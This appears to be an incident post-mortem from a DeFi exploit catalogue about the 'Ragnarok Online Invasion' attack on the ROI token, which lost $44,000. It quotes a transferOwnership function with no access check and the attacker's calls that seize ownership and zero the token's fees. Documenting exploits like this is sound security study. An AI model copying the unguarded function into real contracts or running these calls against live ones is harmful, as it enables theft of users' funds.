# Incorrect access control

Type: Deflationary token, Flashloans
Date: 20220928
Lost: $44,000
POC: https://github.com/SunWeb3Sec/DeFiHackLabs#20220908-ragnarok-online-invasion---broken-access-control
Title: Ragnarok Online Invasion

Root cause: Incorrect access control

Vulnerable code snippet:

[https://bscscan.com/address/0xe48b75dc1b131fd3a8364b0580f76efd04cf6e9c#code#L185](https://bscscan.com/address/0xe48b75dc1b131fd3a8364b0580f76efd04cf6e9c#code#L185)

```solidity
function transferOwnership(address newOwner) public virtual {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
```

---

*deflationary token pattern*

```solidity
				ROI.transferOwnership(address(this));   **//vulnerable point -** Broken Access Control
        ROI.setTaxFeePercent(0);
        ROI.setBuyFee(0, 0);
        ROI.setSellFee(0, 0);
        ROI.setLiquidityFeePercent(0);
```